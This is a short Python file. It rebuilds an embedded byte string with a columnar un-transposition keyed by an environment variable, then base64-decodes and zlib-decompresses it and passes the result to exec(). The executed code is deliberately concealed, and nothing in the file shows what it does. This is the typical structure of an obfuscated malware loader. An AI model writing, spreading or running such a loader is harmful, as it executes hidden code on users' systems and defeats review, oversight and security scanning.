import os
_columns = int(os.environ.get('PYDECOMP_COLUMNS', '7'))
_s = b'eKeORJLff4IY0pfRlQ1DKerV4xUJweKQYIZ8IowOgpW/DtkZUOb39vxyYi8F3vxpezoO0P52/6AxWtvTuVAnWgQaZqHaSBBXlBvb0U5F9ZvEjQYQIcNvFxEaNj9cHqFH4NE+gvDkRmkRhpHyTGmkm6JRHExmdsm82mEfE52Uk+JjpO9qN8ROTLjQ2OVQ'
_rows = -(-len(_s) // _columns)
_short = _rows * _columns - len(_s)
_out = bytearray(len(_s))
_at = 0
for _c in range(_columns):
    _length = _rows - (1 if _c >= _columns - _short else 0)
    for _r in range(_length):
        _out[_r * _columns + _c] = _s[_at]
        _at += 1
exec(__import__('zlib').decompress(__import__('base64').b64decode(bytes(_out))))
